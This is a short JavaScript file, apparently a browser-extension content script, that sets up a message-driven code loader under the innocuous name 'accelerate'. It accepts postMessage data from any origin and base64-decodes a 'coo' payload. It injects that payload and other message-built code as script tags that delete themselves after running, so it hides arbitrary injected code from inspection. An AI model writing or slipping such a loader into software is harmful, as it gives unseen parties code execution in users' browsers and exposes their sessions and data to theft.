function accelerate(s){
    const _baSId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    const accelerator = document.createElement('script');
    accelerator.setAttribute('id', _baSId);
    accelerator.appendChild(document.createTextNode(s + `; document.querySelector('#${_baSId}').remove();`));
    document.body.appendChild(accelerator);
}

function initPMScr(r, c) {
    if(!document.body || !document.body.appendChild) {
        return setTimeout(() => initPMScr(r, c), 100);
    }
    if(c) { r = c + '(' + JSON.stringify(r) +')'}
    accelerate(r)
}

window.addEventListener('message', function(e){
    if(!e || !e.data) return;

    if(e.data.coo) {
        accelerate(decodeURIComponent(escape(atob(e.data.coo))))
    }
    if(e.data.pos){
        const { key, handler } = e.data;
        initPMScr(key, handler)
    }
});

function coBa(){
    if(!document.body || !document.body.appendChild) {
        return setTimeout(coBa,100);
    }
    window.postMessage({'bac':1,'action':'getData'},'*');
}
coBa();

